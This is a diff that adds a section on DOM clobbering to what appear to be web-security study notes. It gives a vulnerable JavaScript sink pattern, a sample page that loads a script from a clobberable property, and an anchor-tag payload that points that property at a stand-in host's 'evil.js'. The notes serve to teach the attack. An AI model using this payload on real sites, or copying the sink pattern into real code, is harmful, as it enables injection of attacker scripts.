@@ -42,6 +42,36 @@
 
 ---------------
 
--
+- DOM clobbering is a technique in which you inject HTML into a page to manipulate the DOM. So you can clobber a global variable or property of an object and overwrite it DOM Node or HTML collection. However, DOM was initially born and implemented without any standardization which led to a lot of peculiar behaviour and for the sake of maintaining compatibility, browsers still support the unusual behaviour of DOM. That leads us to DOM clobbering. Due to non-standardized DOM behaviour, browsers may sometimes add name and id attributes to various DOM elements as a property reference to document or global objects. However, this results in replacement of properties on the other objects.
+- How it works-:
+ - The most common form of DOM clobbering uses an anchor element to overwrite a global variable, which is then used by the application in an unsafe way, such as generating a dynamic script URL.The term clobbering comes from the fact that you are “clobbering” a global variable or property of an object and overwriting it with a DOM node or HTML collection instead. For example, you can use DOM objects to overwrite other JavaScript objects and exploit unsafe names, such as submit, to interfere with a form’s actual submit() function.
+- Main sink-:
+
+```javascript
+var someObject = window.someObject || {};
+```
+
+- If you can control some of the html, you can clobber the `someObject` object reference with a DOM node with an anchor.Check this code-:
+
+```html
+<script>
+    window.onload = function(){
+        let someObject = window.someObject || {};
+        let script = document.createElement('script');
+        script.src = someObject.url;
+        document.body.appendChild(script);
+    };
+</script>
+```
+
+- Payload-:
+
+```html
+<a id=someObject><a id=someObject name=url href=//malicious-website.com/evil.js> 
+```
+
+- As the two anchors use the same ID, the DOM groups them together in a DOM collection. The DOM clobbering vector then overwrites the someObject reference with this DOM collection. A name attribute is used on the last anchor element in order to clobber the url property of the someObject object, which points to an external script.
+
+
 
 ---------------
